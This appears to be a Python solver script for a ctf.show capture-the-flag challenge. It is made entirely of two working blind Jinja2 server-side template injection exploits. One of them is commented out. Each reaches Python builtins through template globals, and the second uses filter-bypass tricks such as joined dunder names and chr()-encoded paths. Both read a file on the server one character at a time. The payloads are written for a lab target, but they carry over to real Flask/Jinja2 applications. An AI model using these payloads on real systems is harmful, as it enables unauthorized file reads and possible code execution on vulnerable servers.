'''
import requests
 
url="http://a7517952-2858-46dc-be5c-10157fac7909.challenge.ctf.show/"
flag=""
for i in range(1,100):
    for j in "abcdefghijklmnopqrstuvwxyz0123456789-{}":
        params={
            'name':"{{% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read({}) %}}{{% if a==request.values.d %}}feng{{% endif %}}".format(i),
            'a':'__globals__',
            'b':'__builtins__',
            'c':'/flag',
            'd':f'{flag+j}'
        }
        r=requests.get(url=url,params=params)
        if "feng" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break
 '''

import requests
import string
def ccchr(s):
    t=''
    for i in range(len(s)):
        if i<len(s)-1:
            t+='chr('+str(ord(s[i]))+')%2b'
        else:
            t+='chr('+str(ord(s[i]))+')'
    return t
url ='''http://a25cd7b8-b9c3-407b-ad6b-c9f732ca3adf.challenge.ctf.show/?name=
{% set a=(()|select|string|list).pop(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{% set cmd2='''
 
s=string.digits+string.ascii_lowercase+'{_-}'
flag=''
for i in range(1,50):
    print(i)
    #print(flag)
    for j in s:
        x=flag+j
        u=url+ccchr(x)+'%}'+'{% if x.open(cmd).read('+str(i)+')==cmd2%}'+'1341'+'{% endif%}'
        #print(u)
        r=requests.get(u)
        if("1341" in r.text):           
            flag=x
            print(flag)
            break

